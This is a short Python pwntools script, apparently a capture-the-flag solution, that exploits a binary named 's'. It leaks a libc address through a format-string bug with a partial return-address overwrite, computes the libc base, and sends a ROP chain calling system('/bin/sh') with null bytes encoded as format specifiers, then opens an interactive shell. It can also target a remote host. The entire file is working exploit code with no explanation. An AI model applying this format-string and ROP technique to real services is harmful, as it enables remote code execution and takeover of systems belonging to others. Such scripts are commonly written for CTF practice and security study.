#!/usr/bin/env python3
from pwn import *
from time import sleep

e = ELF("s")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

context.binary = e

def conn():
	if args.REMOTE:
		return remote("addr", 1337)
	elif args.GDB:
		return gdb.debug(e.path, "b *(main+138)\nc")
	else:
		return process(e.path)

if __name__ == '__main__':
	while True:
		r = conn()
		try:
			libc.address = 0
			# %12$p expands to 14 bytes
			r.sendline(b'%12$p##'+b'a'*0x28+b'\x69')
			#r.interactive()
			orig = int(r.recvuntil(b'##', drop=True).decode()[2:], 16)
			print(hex(orig))
			assert (orig-0x83) & 0xffff == 0
			leak = orig - libc.sym['__libc_start_main'] - 243
			r.recv()
			print("\n\n\nlibc base: " + hex(leak))
			assert leak & 0xfff == 0
			# 0xe3afe, 0xe3b01, 0xe3b04
			g1 = 0xe3afe
			g2 = 0xe3b01
			g3 = 0xe3b04
			libc.address = leak
			# we can replace null bytes with %_$c
			#gdb.attach(r, gdbscript='b *(main+138)')
			#sleep(5)
			rop = ROP(libc)
			rop.system(next(libc.search(b'/bin/sh\0')))
			r.sendline(b'a'*0x38+(p64(rop.ret.address)+rop.chain()).replace(b'\0', b'%15$c'))
			r.interactive()
		except AssertionError:
			print("fail")
			r.close()
		except KeyboardInterrupt:
			exit(0)
